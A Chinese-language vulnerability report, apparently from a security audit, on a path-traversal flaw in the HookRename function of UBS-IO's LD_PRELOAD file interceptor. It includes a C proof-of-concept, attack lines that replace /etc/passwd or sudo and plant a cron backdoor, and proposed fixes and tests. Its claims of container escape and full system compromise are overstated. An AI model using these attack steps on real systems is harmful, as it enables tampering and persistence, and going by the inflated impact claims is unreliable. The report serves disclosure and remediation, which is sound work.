# VULN-IO-015: HookRename函数路径验证缺失致任意文件重命名移动

## 漏洞基本信息

| 属性 | 值 |
|----------|-------|
| **漏洞ID** | VULN-IO-015 |
| **类型** | Path Traversal (路径遍历) |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') |
| **严重性** | HIGH |
| **文件** | `ubsio-boostio/src/io_interceptor/src/posix_interceptor.cpp` |
| **行号** | 529-538 |
| **函数** | `HookRename` |
| **置信度** | 85% -> **已确认为真实漏洞** |

---

## 1. 漏洞触发条件与攻击场景分析

### 1.1 漏洞核心机制

漏洞存在于 `HookRename` 函数的路径验证逻辑中：

```cpp
// posix_interceptor.cpp:529-538
int HookRename(const char *oldName, const char *newName)
{
    // CheckPath only verifies non-null and non-empty
    if (!CheckPath(oldName) || !CheckPath(newName) || !InitNativeHook() || CHECKNATIVEFUNC(rename)) {
        return -1;
    }
    // proxy->rename is nullptr (not registered), so this path is always taken
    if (CHECKPROXYLOADED || CHECKPROXYFUNC(rename)) {
        return NATIVE(rename)(oldName, newName);  // Direct syscall!
    }
    return PROXY(rename)(oldName, newName);
}
```

**关键发现：**

1. **CheckPath实现缺陷 (行 68-79)**:
   ```cpp
   static inline bool CheckPath(const char *path)
   {
       if (path == nullptr) {
           errno = EFAULT;
           return false;
       }
       if (path[0] == '\0') {
           errno = ENOENT;
           return false;
       }
       return true;  // NO path traversal validation!
   }
   ```
   - 仅检查NULL指针和空字符串
   - **缺失**: `..`序列检测、绝对路径验证、符号链接解析、mountPoint边界检查

2. **MountPoint隔离概念**:
   来自 `interceptor_context.h:24`:
   ```cpp
   std::string mountPoint = "/bfs";
   ```
   拦截器有**挂载点隔离概念**，表明应用应该只能访问 `/bfs` 内的文件。

3. **Rename操作缺失Proxy实现**:
   来自 `proxy_operations.cpp:41-55` (`FillInterceptorOps`):
   - 仅注册: open, open64, openat, creat, creat64, close, read, readv, pread, pread64, preadv64, write
   - **`rename`未注册** -> proxy->rename == nullptr
   - 这导致 `CHECKPROXYFUNC(rename)` 为true，路由到 `NATIVE(rename)`
   - 绕过了proxy层存在的任何mountPoint检查

4. **与其他操作对比**:
   - `OpenInner` 在proxy_operations.cpp中调用 `CheckSelfPath(mountPoint, restoredPath)`
   - 但rename没有proxy实现，因此没有mountPoint检查

### 1.2 完整数据流分析

```
攻击数据流路径:
======================

[攻击入口点]
    |
    v
应用调用 rename(oldName, newName)
    |  oldName = "../../../etc/passwd"
    |  newName = "/tmp/malicious_passwd"
    v
posix_interface.cpp:293 - INTERCEPTOR_API rename()
    |  return HookRename(oldName, newName);
    v
posix_interceptor.cpp:529 - HookRename()
    |  CheckPath(oldName) -> PASS (仅检查非空)
    |  CheckPath(newName) -> PASS (仅检查非空)
    |  CHECKPROXYFUNC(rename) -> TRUE (proxy->rename == nullptr)
    v
NATIVE(rename)(oldName, newName)
    |  直接调用rename系统调用
    |  无mountPoint验证!
    |  无".."路径遍历检查!
    v
rename系统调用
    |
    v
文件从 /etc/passwd 移动到 /tmp/malicious_passwd
    |
    v
系统文件被劫持!
```

### 1.3 攻击场景

#### 场景A: 系统文件劫持 (关键)

```
前提条件:
- 应用配置为仅访问 /bfs 目录
- 应用在某处有写权限
- LD_PRELOAD=/path/to/libock_interceptor.so

攻击步骤:
1. rename("/etc/passwd", "/tmp/backup_passwd")
   - CheckPath通过 (非空, 非空字符串)
   - NATIVE(rename)直接调用
   - 无mountPoint检查
   -> 系统密码文件被移动!

2. rename("/tmp/malicious_passwd", "/etc/passwd")
   -> 恶意密码文件被安装!

影响: 通过密码文件操纵实现完全系统入侵
```

#### 场景B: 通过Rename窃取敏感数据

```
攻击:
rename("/bfs/sensitive_config.json", "/tmp/exfil_config.json")

结果:
- 文件移出受保护的 /bfs 挂载点
- 无mountPoint边界检查发生
- 攻击者可以从 /tmp 读取敏感数据
```

#### 场景C: 通过文件替换实现权限提升

```
攻击:
1. rename("/usr/bin/sudo", "/tmp/sudo_backup")
2. rename("/tmp/malicious_sudo", "/usr/bin/sudo")

结果:
- sudo二进制文件被替换为恶意版本
- 可能实现权限提升
```

#### 场景D: 跨租户数据篡改 (多租户场景)

```
如果UBS-IO在多租户环境中使用:
租户A配置: mountPoint = "/bfs/tenant_a"
租户B配置: mountPoint = "/bfs/tenant_b"

租户A的攻击:
rename("/bfs/tenant_b/confidential.dat", "/bfs/tenant_a/stolen.dat")

结果:
- 跨租户数据盗窃
- rename上无mountPoint验证
```

---

## 2. PoC构造思路

### 2.1 环境设置

```bash
# 构建UBS-IO
cd /home/pwn20tty/Desktop/opencode_project/openeuler/ubs-io/ubsio-boostio
bash build.sh -t release

# 创建测试环境
mkdir -p /bfs/app_data
mkdir -p /tmp/secret_area
echo "SENSITIVE_DATA" > /tmp/secret_area/confidential.txt
chmod 600 /tmp/secret_area/confidential.txt

# 设置拦截器
export LD_PRELOAD=/path/to/libock_interceptor.so
```

### 2.2 PoC程序 - 文件重命名攻击

```c
// poc_rename.c - 演示通过rename()进行路径遍历
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

int main(int argc, char *argv[]) {
    printf("=== VULN-IO-015 Rename路径遍历PoC ===\n\n");
    
    // 场景1: 通过相对路径逃逸mountPoint
    printf("测试1: 使用'..'逃逸/bfs挂载点\n");
    const char *src1 = "/bfs/app_data/test.txt";
    const char *dst1 = "../../tmp/secret_area/escaped.txt";
    
    // 先创建源文件
    FILE *f = fopen(src1, "w");
    if (f) {
        fwrite("test_data", 9, 1, f);
        fclose(f);
    }
    
    int ret1 = rename(src1, dst1);
    printf("  rename(\"%s\", \"%s\") = %d\n", src1, dst1, ret1);
    if (ret1 == 0) {
        printf("  成功! 文件逃逸了挂载点!\n");
        printf("  检查文件是否存在: ");
        if (access("/tmp/secret_area/escaped.txt", F_OK) == 0) {
            printf("是 - 漏洞已确认!\n");
        }
    }
    
    // 场景2: 绝对路径绕过
    printf("\n测试2: 绝对路径绕过\n");
    const char *src2 = "/bfs/app_data/test2.txt";
    const char *dst2 = "/etc/vuln_test_marker.txt";
    
    f = fopen(src2, "w");
    if (f) {
        fwrite("marker", 6, 1, f);
        fclose(f);
    }
    
    // 注意: 这可能因权限失败，但演示了漏洞
    int ret2 = rename(src2, dst2);
    printf("  rename(\"%s\", \"%s\") = %d\n", src2, dst2, ret2);
    printf("  如果权限允许，文件会被移动到/etc\n");
    
    // 场景3: 移动系统文件
    printf("\n测试3: 系统文件操纵 (需要root)\n");
    // rename("/etc/passwd", "/tmp/passwd_backup")
    // rename("/tmp/malicious_passwd", "/etc/passwd")
    printf("  概念: rename(\"/etc/passwd\", \"/tmp/passwd_backup\")\n");
    printf("  会绕过任何mountPoint限制!\n");
    
    return 0;
}
```

### 2.3 PoC编译与执行

```bash
# 编译
gcc -o poc_rename poc_rename.c

# 加载拦截器运行
LD_PRELOAD=/path/to/libock_interceptor.so ./poc_rename

# 预期输出显示文件逃逸了挂载点边界
```

---

## 3. 实际可利用性与影响评估

### 3.1 可利用性分析

| 因素 | 评估 | 详情 |
|--------|------------|---------|
| **触发难度** | 简单 | 直接系统调用，无复杂条件 |
| **攻击向量** | 本地 | 需要应用运行时加载拦截器 |
| **权限要求** | 低 | 应用自身的文件权限 |
| **用户交互** | 无 | 通过文件操作自动触发 |
| **影响范围** | 已改变 | 可影响挂载点外的文件 |
| **影响类型** | 高 | 文件操纵、数据窃取、系统入侵 |

**可利用性评分: 7/10 (高)**

### 3.2 影响范围

1. **直接影响**:
   - 绕过mountPoint隔离
   - 将文件移动到/来自任意位置
   - 逃逸沙箱/受限目录

2. **系统影响**:
   - 系统文件劫持 (/etc/passwd, /usr/bin/sudo)
   - 配置文件操纵
   - 日志文件篡改

3. **数据影响**:
   - 敏感数据窃取
   - 跨租户数据访问 (多租户部署场景)
   - 备份/快照篡改

4. **运维影响**:
   - 通过关键文件删除实现服务中断
   - 持久化机制安装
   - 完整性违规

### 3.3 真实攻击链

```
攻击链1: 容器逃逸
================================
[容器挂载点=/bfs]
    | rename("/etc/shadow", "/tmp/shadow_backup")
    | (绕过挂载点，访问宿主机文件系统)
    v
[宿主机系统入侵]

攻击链2: 多租户数据窃取
========================================
[租户A应用]
    | rename("/bfs/tenant_b/secrets.db", "/bfs/tenant_a/stolen.db")
    | (rename无挂载点验证)
    v
[跨租户数据泄露]

攻击链3: 持久化安装
=========================================
[恶意应用]
    | rename("/tmp/.hidden/backdoor", "/usr/local/bin/service_helper")
    | rename("/tmp/.hidden/config", "/etc/cron.d/backdoor")
    v
[持久化后门已安装]
```

### 3.4 为什么这是真实漏洞

**关键证据**:

1. **设计意图**: mountPoint变量存在 (`/bfs`)，表明隔离意图
2. **实现不一致**: Open/Creat有mountPoint检查，rename没有
3. **安全边界绕过**: 配置为 `/bfs` 的应用可以重命名文件到任何地方
4. **真实部署风险**: UBS-IO常见于多租户/容器场景

---

## 4. 修复建议

### 4.1 立即修复 (优先级: 高)

```cpp
// posix_interceptor.cpp - 增强的CheckPath实现
static inline bool CheckPath(const char *path)
{
    if (path == nullptr) {
        errno = EFAULT;
        return false;
    }
    if (path[0] == '\0') {
        errno = ENOENT;
        return false;
    }
    
    // 新增: 路径遍历检测
    if (strstr(path, "..") != nullptr) {
        errno = EACCES;
        INTERCEPTORLOG_WARN("检测到路径遍历: %s", path);
        return false;
    }
    
    // 新增: 验证挂载点 (如果配置)
    const char* mountPoint = GetMountPoint(); // 需要添加访问器
    if (mountPoint != nullptr && mountPoint[0] != '\0') {
        char resolvedPath[PATH_MAX];
        if (realpath(path, resolvedPath) == nullptr) {
            // 路径尚不存在 - 检查前缀
            if (path[0] == '/' && strncmp(path, mountPoint, strlen(mountPoint)) != 0) {
                errno = EACCES;
                INTERCEPTORLOG_WARN("绝对路径在挂载点外: %s", path);
                return false;
            }
        } else {
            if (strncmp(resolvedPath, mountPoint, strlen(mountPoint)) != 0) {
                errno = EACCES;
                INTERCEPTORLOG_WARN("解析路径在挂载点外: %s", resolvedPath);
                return false;
            }
        }
    }
    
    return true;
}
```

### 4.2 实现Proxy Rename操作

```cpp
// proxy_operations.cpp - 添加rename proxy实现
int ProxyOperations::Rename(const char *oldName, const char *newName)
{
    CLOG_DEBUG("Rename: " << oldName << " -> " << newName);
    
    std::string oldPath, newPath;
    auto ret1 = FullPath(oldName, oldPath);
    auto ret2 = FullPath(newName, newPath);
    
    if (ret1 != BIO_OK || ret2 != BIO_OK) {
        return -1;
    }
    
    // 验证两个路径都在挂载点内
    if (CheckSelfPath(CONTEXT.mountPoint, oldPath) != 0 ||
        CheckSelfPath(CONTEXT.mountPoint, newPath) != 0) {
        CLOG_WARN("Rename拒绝: 路径在挂载点外");
        errno = EACCES;
        return -1;
    }
    
    return CONTEXT.GetOperations()->rename(oldName, newName);
}

// proxy_operations.cpp - 更新FillInterceptorOps
void ProxyOperations::FillInterceptorOps(InterceptorProxyOperations &ops)
{
    ops.open = OpenProxy;
    ops.open64 = Open64Proxy;
    ops.openat = OpenAtProxy;
    ops.creat = Creat;
    ops.creat64 = Creat64;
    ops.close = Close;
    ops.read = Read;
    ops.readv = Readv;
    ops.pread = Pread;
    ops.pread64 = Pread64;
    ops.preadv64 = preadv64;
    ops.write = Write;
    ops.rename = Rename;  // 新增: 添加rename操作!
    // ... 其他操作
}
```

### 4.3 综合路径验证框架

```cpp
// 新文件: path_validator.h
#ifndef PATH_VALIDATOR_H
#define PATH_VALIDATOR_H

#include <string>
#include <cstring>
#include <limits.h>
#include <stdlib.h>

namespace ock {
namespace interceptor {

class PathValidator {
public:
    static bool ValidateAgainstMountPoint(const char* path, const std::string& mountPoint);
    static bool ContainsTraversalSequence(const char* path);
    static std::string ResolvePath(const char* path);
    static bool IsWithinAllowedDirectory(const char* resolvedPath, const std::string& allowedDir);
};

} // namespace interceptor
} // namespace ock

#endif
```

### 4.4 配置化安全策略

```cpp
// 添加可配置的路径限制
struct SecurityPolicy {
    std::string allowedBaseDir;
    bool allowAbsolutePaths;
    bool allowTraversalSequences;  // 应为false
    bool resolveSymlinks;
    std::vector<std::string> blacklistedPaths;
    
    bool ValidatePath(const char* path) const {
        // 实现综合验证
    }
};
```

### 4.5 测试要求

```cpp
// 路径验证单元测试
TEST(PathValidator, DetectTraversalSequence) {
    EXPECT_FALSE(PathValidator::ContainsTraversalSequence("/safe/path"));
    EXPECT_TRUE(PathValidator::ContainsTraversalSequence("../escape"));
    EXPECT_TRUE(PathValidator::ContainsTraversalSequence("/safe/../escape"));
    EXPECT_TRUE(PathValidator::ContainsTraversalSequence("....//escape"));  // 变体
}

TEST(PathValidator, EnforceMountPointBoundary) {
    std::string mountPoint = "/bfs";
    EXPECT_TRUE(PathValidator::ValidateAgainstMountPoint("/bfs/file.txt", mountPoint));
    EXPECT_FALSE(PathValidator::ValidateAgainstMountPoint("/etc/passwd", mountPoint));
    EXPECT_FALSE(PathValidator::ValidateAgainstMountPoint("/bfs/../etc/passwd", mountPoint));
}
```

---

## 5. 总结

| 方面 | 发现 |
|--------|---------|
| **漏洞状态** | **已确认 - 真实漏洞** |
| **根因** | CheckPath缺少路径遍历验证; rename无proxy实现 |
| **攻击向量** | rename()系统调用绕过挂载点隔离 |
| **严重性** | 高 - 可操纵系统文件、逃逸隔离 |
| **可利用性** | 高 - 简单触发，无复杂前提条件 |
| **所需修复** | 为所有操作实现综合路径验证 |
| **优先级** | **关键** - 生产部署前立即修复 |

---

## 参考

- CWE-22: Path Traversal
- VULN-IO-001: 相关CheckPath漏洞 (相似根因)
- VULN-IO-007: Proxy加载安全 (相关基础设施)
- interceptor_context.h: mountPoint定义
- proxy_operations.cpp: 缺失rename注册